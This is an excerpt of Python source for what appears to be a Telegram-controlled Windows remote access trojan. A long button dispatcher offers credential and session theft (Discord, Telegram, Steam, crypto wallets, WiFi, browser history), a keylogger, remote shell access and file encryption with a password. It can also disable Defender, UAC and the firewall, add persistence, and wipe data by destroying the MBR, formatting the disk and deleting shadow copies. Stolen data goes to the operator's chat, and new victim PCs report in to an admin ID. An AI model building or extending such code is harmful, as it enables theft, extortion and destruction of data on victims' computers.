...
def callback(update, context):
    ...
    # --- ВИЗУАЛЬНЫЕ ЭФФЕКТЫ (в отдельном потоке, чтобы не блокировать бота) ---
    if data == "matrix":
    ...
    # --- ОСТАЛЬНЫЕ КОМАНДЫ (мгновенные или не блокируют) ---
    if data == "screenshot":
        img = get_screenshot()
        if img: context.bot.send_photo(chat_id, photo=BytesIO(img))
        else: context.bot.send_message(chat_id, "❌ Failed")
        ...
        context.bot.send_message(chat_id, get_system_info())
    elif data == "cmd":
        context.user_data['cmd_mode'] = True
        context.bot.send_message(chat_id, "📟 Enter CMD:")
    elif data == "powershell":
        context.user_data['ps_mode'] = True
        context.bot.send_message(chat_id, "⚡ Enter PowerShell:")
    elif data == "processes":
        context.bot.send_message(chat_id, f"📋 Processes:\n{list_processes()}")
    elif data == "kill":
        context.user_data['kill_mode'] = True
        context.bot.send_message(chat_id, "💀 Enter process name:")
    elif data == "startproc":
        context.user_data['startproc_mode'] = True
        context.bot.send_message(chat_id, "🚀 Enter process path:")
        ...
        context.bot.send_message(chat_id, f"📶 WiFi:\n{steal_wifi()}")
    elif data == "discord":
        context.bot.send_message(chat_id, f"🎮 Discord:\n{steal_discord()}")
    elif data == "telegram":
        result = steal_telegram()
        if os.path.exists(result):
            with open(result, 'rb') as f:
                context.bot.send_document(chat_id, document=BytesIO(f.read()), filename="telegram_sessions.zip")
            os.remove(result)
        else: context.bot.send_message(chat_id, result)
    elif data == "history":
        context.bot.send_message(chat_id, f"📜 History:\n{steal_browser_history()}")
    elif data == "steam":
        context.bot.send_message(chat_id, f"🎮 Steam:\n{steal_steam()}")
    elif data == "crypto":
        context.bot.send_message(chat_id, f"💰 Crypto:\n{steal_crypto()}")
    elif data == "scream":
        context.user_data['scream_mode'] = True
        context.bot.send_message(chat_id, "🎬 Enter video path:")
    elif data == "upload":
        context.user_data['upload_mode'] = True
        context.bot.send_message(chat_id, "📤 Send the file you want to upload:")
    elif data == "downloadfile":
        context.user_data['downloadfile_mode'] = True
        context.bot.send_message(chat_id, "📥 Enter file path to download:")
    elif data == "encrypt":
        context.user_data['encrypt_mode'] = True
        context.bot.send_message(chat_id, "🔒 Enter path:")
    elif data == "decrypt":
        ...
        context.bot.send_message(chat_id, set_volume(100))
    elif data == "volmin":
        context.bot.send_message(chat_id, set_volume(0))
    elif data == "persist":
        context.bot.send_message(chat_id, add_persistence())
    elif data == "uac":
        context.bot.send_message(chat_id, disable_uac())
    elif data == "bsod":
        context.bot.send_message(chat_id, trigger_bsod())
    elif data == "minimize":
        ...
        context.bot.send_message(chat_id, "💬 Enter text:")
    elif data == "location":
        context.bot.send_message(chat_id, get_location())
    elif data == "download":
        context.user_data['download_mode'] = True
        context.bot.send_message(chat_id, "📥 Enter URL:")
    elif data == "listfiles":
        context.user_data['listfiles_mode'] = True
        context.bot.send_message(chat_id, "📂 Enter path:")
    elif data == "wallpaper_direct":
        context.user_data['awaiting_wallpaper'] = True
        context.bot.send_message(chat_id, "🖼️ *Отправь картинку для установки обоев:*", parse_mode='Markdown')
    elif data == "shutdown":
        context.bot.send_message(chat_id, shutdown_pc())
    elif data == "reboot":
        context.bot.send_message(chat_id, reboot_pc())
    elif data == "keylogger":
        context.bot.send_message(chat_id, f"⌨️ Keylogger:\n{keylogger.dump()}")
    elif data == "clipboard":
        context.bot.send_message(chat_id, f"📋 Clipboard:\n{get_clipboard()}")
    elif data == "block_usb":
        ...
        context.bot.send_message(chat_id, destroy_mbr())
    elif data == "stress_gpu":
        context.bot.send_message(chat_id, stress_gpu(60))
    elif data == "stress_cpu":
        context.bot.send_message(chat_id, stress_cpu(60))
    elif data == "format_disk":
        context.bot.send_message(chat_id, format_disk())
    elif data == "kill_logonui":
        context.bot.send_message(chat_id, kill_logonui())
    elif data == "disable_defender":
        context.bot.send_message(chat_id, disable_defender())
    elif data == "disable_firewall":
        context.bot.send_message(chat_id, disable_firewall())
    elif data == "disable_updates":
        context.bot.send_message(chat_id, disable_updates())
    elif data == "disable_system_restore":
        context.bot.send_message(chat_id, disable_system_restore())
    elif data == "disable_task_manager":
        context.bot.send_message(chat_id, disable_task_manager())
    elif data == "enable_task_manager":
        context.bot.send_message(chat_id, enable_task_manager())
    elif data == "disable_registry_editor":
        context.bot.send_message(chat_id, disable_registry_editor())
    elif data == "enable_registry_editor":
        context.bot.send_message(chat_id, enable_registry_editor())
    elif data == "disable_cmd":
        context.bot.send_message(chat_id, disable_cmd())
    elif data == "enable_cmd":
        context.bot.send_message(chat_id, enable_cmd())
    elif data == "dark_mode":
        context.bot.send_message(chat_id, enable_dark_mode())
    elif data == "light_mode":
        context.bot.send_message(chat_id, disable_dark_mode())
    elif data == "high_contrast_on":
        context.bot.send_message(chat_id, enable_high_contrast())
    elif data == "high_contrast_off":
        context.bot.send_message(chat_id, disable_high_contrast())
    elif data == "high_performance":
        context.bot.send_message(chat_id, set_power_scheme("high"))
    elif data == "power_saver":
        context.bot.send_message(chat_id, set_power_scheme("low"))
    elif data == "disable_sleep":
        context.bot.send_message(chat_id, disable_sleep())
    elif data == "copy_file":
        context.user_data['copy_file_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter source and destination paths (src|dst):")
    elif data == "move_file":
        context.user_data['move_file_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter source and destination paths (src|dst):")
    elif data == "delete_file":
        context.user_data['delete_file_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter file path to delete:")
    elif data == "rename_file":
        context.user_data['rename_file_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter old and new names (old|new):")
    elif data == "create_folder":
        context.user_data['create_folder_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter folder path to create:")
    elif data == "delete_folder":
        context.user_data['delete_folder_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter folder path to delete:")
    elif data == "hide_file":
        context.user_data['hide_file_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter file path to hide:")
    elif data == "unhide_file":
        context.user_data['unhide_file_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter file path to unhide:")
    elif data == "make_readonly":
        context.user_data['make_readonly_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter file path to make read-only:")
    elif data == "make_writable":
        context.user_data['make_writable_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter file path to make writable:")
    elif data == "file_hash":
        context.user_data['file_hash_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter file path:")
    elif data == "search_files":
        context.user_data['search_files_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter path|filename (e.g. C:\\Users|test):")
    elif data == "search_by_extension":
        context.user_data['search_by_extension_mode'] = True
        context.bot.send_message(chat_id, "📁 Enter path|extension (e.g. C:\\Users|.txt):")
        ...
        context.bot.send_message(chat_id, flush_dns())
    elif data == "public_ip":
        ...
        context.bot.send_message(chat_id, f"🌐 Adapters:\n{get_network_adapters()}")
    elif data == "enable_adapter":
        context.user_data['enable_adapter_mode'] = True
        context.bot.send_message(chat_id, "🌐 Enter adapter name:")
    elif data == "disable_adapter":
        context.user_data['disable_adapter_mode'] = True
        context.bot.send_message(chat_id, "🌐 Enter adapter name:")
    elif data == "arp_table":
        context.bot.send_message(chat_id, f"🌐 ARP Table:\n{get_arp_table()}")
    elif data == "disable_windows_security":
        context.bot.send_message(chat_id, disable_windows_security())
    elif data == "disable_smart_screen":
        context.bot.send_message(chat_id, disable_smart_screen())
    elif data == "disable_bitlocker":
        context.bot.send_message(chat_id, disable_bitlocker())
    elif data == "installed_software":
        context.bot.send_message(chat_id, f"📦 Software:\n{get_installed_software()}")
    elif data == "running_services":
        context.bot.send_message(chat_id, f"🔄 Services:\n{get_running_services()}")
    elif data == "stop_service":
        context.user_data['stop_service_mode'] = True
        context.bot.send_message(chat_id, "🔑 Enter service name to stop:")
    elif data == "start_service":
        context.user_data['start_service_mode'] = True
        context.bot.send_message(chat_id, "🔑 Enter service name to start:")
    elif data == "disable_service":
        context.user_data['disable_service_mode'] = True
        context.bot.send_message(chat_id, "🔑 Enter service name to disable:")
    elif data == "enable_service":
        context.user_data['enable_service_mode'] = True
        context.bot.send_message(chat_id, "🔑 Enter service name to enable:")
    elif data == "startup_programs":
        context.bot.send_message(chat_id, f"🚀 Startup:\n{get_startup_programs()}")
    elif data == "disable_startup":
        context.user_data['disable_startup_mode'] = True
        context.bot.send_message(chat_id, "🔑 Enter startup program name to disable:")
    elif data == "enable_startup":
        context.user_data['enable_startup_mode'] = True
        context.bot.send_message(chat_id, "🔑 Enter name|path (e.g. Program|C:\\file.exe):")
    elif data == "flip_screen":
        context.bot.send_message(chat_id, flip_screen())
    elif data == "invert_colors":
        context.bot.send_message(chat_id, invert_colors())
    elif data == "grayscale":
        context.bot.send_message(chat_id, grayscale_mode())
    elif data == "night_mode":
        context.bot.send_message(chat_id, night_mode())
    elif data == "magnify":
        context.bot.send_message(chat_id, magnify_screen())
    elif data == "blur":
        context.bot.send_message(chat_id, blur_screen())
    elif data == "beep":
        ...
        context.bot.send_message(chat_id, mute_system())
    elif data == "unmute":
        context.bot.send_message(chat_id, unmute_system())
    elif data == "test_audio":
        context.bot.send_message(chat_id, test_audio())
    elif data == "delete_system_files":
        context.bot.send_message(chat_id, delete_system_files())
    elif data == "corrupt_registry":
        context.bot.send_message(chat_id, corrupt_registry())
    elif data == "delete_all_data":
        context.bot.send_message(chat_id, delete_all_data())
    elif data == "wipe_free_space":
        context.bot.send_message(chat_id, wipe_free_space())
    elif data == "overwrite_files":
        context.bot.send_message(chat_id, overwrite_files())
    elif data == "random_corruption":
        context.bot.send_message(chat_id, random_corruption())
    elif data == "delete_backups":
        context.bot.send_message(chat_id, delete_backups())
    elif data == "delete_shadow_copies":
        context.bot.send_message(chat_id, delete_shadow_copies())
    elif data == "kill_all_processes":
        context.bot.send_message(chat_id, kill_all_processes())
    elif data == "crash_explorer":
        context.bot.send_message(chat_id, crash_explorer())
    elif data == "delete_registry_keys":
        context.bot.send_message(chat_id, delete_registry_keys())
    elif data == "enable_guest":
        context.bot.send_message(chat_id, enable_guest_account())
    elif data == "disable_guest":
        context.bot.send_message(chat_id, disable_guest_account())
    elif data == "cpu_usage":
        context.bot.send_message(chat_id, get_cpu_usage())
    elif data == "ram_usage":
        context.bot.send_message(chat_id, get_ram_usage())
    elif data == "disk_usage":
        context.bot.send_message(chat_id, get_disk_usage())
    elif data == "gpu_usage":
        context.bot.send_message(chat_id, get_gpu_usage())
    elif data == "network_usage":
        context.bot.send_message(chat_id, get_network_usage())
    elif data == "system_uptime":
        context.bot.send_message(chat_id, get_system_uptime())
    elif data == "last_boot_time":
        context.bot.send_message(chat_id, get_last_boot_time())
    elif data == "open_cd":
        ...
        context.bot.send_message(chat_id, get_windows_version())
    elif data == "bios_info":
        context.bot.send_message(chat_id, get_bios_info())
    elif data == "motherboard_info":
        context.bot.send_message(chat_id, get_motherboard_info())
    elif data == "ram_details":
        context.bot.send_message(chat_id, get_ram_details())
    elif data == "disk_details":
        context.bot.send_message(chat_id, get_disk_details())
    elif data == "gpu_details":
        context.bot.send_message(chat_id, get_gpu_details())
    elif data == "cpu_details":
        context.bot.send_message(chat_id, get_cpu_details())
    elif data == "lock_workstation":
        context.bot.send_message(chat_id, lock_workstation())
    elif data == "logoff":
        context.bot.send_message(chat_id, logoff_user())
    elif data == "switch_user":
        context.bot.send_message(chat_id, switch_user())
    elif data == "explorer":
        ...
        context.bot.send_message(chat_id, get_dns_servers())
    elif data == "set_time":
        ...
        context.bot.send_message(chat_id, disable_grayscale())
    elif data == "disable_invert":
        context.bot.send_message(chat_id, disable_invert())
    elif data == "speak":
...
def handle_message(update, context):
    ...
    if context.user_data.get('cmd_mode'):
            ...
            if 1 <= duration <= 60:
                ...
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        context.bot.send_video(chat_id, video=BytesIO(f.read()), filename=filename)
                    os.remove(filename)
            else: context.bot.send_message(chat_id, "❌ 1-60 sec only")
        except: context.bot.send_message(chat_id, "❌ Invalid")
        ...
        context.bot.send_message(chat_id, scream_make(text))
        ...
        if result:
            with open(result, 'rb') as f:
                context.bot.send_document(chat_id, document=BytesIO(f.read()), filename=os.path.basename(result))
        else: context.bot.send_message(chat_id, "❌ File not found")
        ...
        context.bot.send_message(chat_id, "🔒 Enter password:")
    elif context.user_data.get('encrypt_pass_mode'):
        context.user_data['encrypt_pass_mode'] = False
        context.bot.send_message(chat_id, encrypt_files(context.user_data['encrypt_path'], text))
        ...
        context.bot.send_message(chat_id, decrypt_files(context.user_data['decrypt_path'], text))
        ...
        try:
            ...
            if 1 <= duration <= 60:
                ...
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        context.bot.send_audio(chat_id, audio=BytesIO(f.read()), filename=filename)
                    os.remove(filename)
            else: context.bot.send_message(chat_id, "❌ 1-60 sec only")
        except: context.bot.send_message(chat_id, "❌ Invalid")
    elif context.user_data.get('msgbox_mode'):
        context.user_data['msgbox_mode'] = False
        context.bot.send_message(chat_id, show_messagebox(text))
...
if PC_ID not in known_pcs:
    ...
    try:
        context.bot.send_message(ADMIN_ID, f"🟢 New PC connected: {PC_ID}\nИспользуй команду /list для выбора")
    except:
        pass
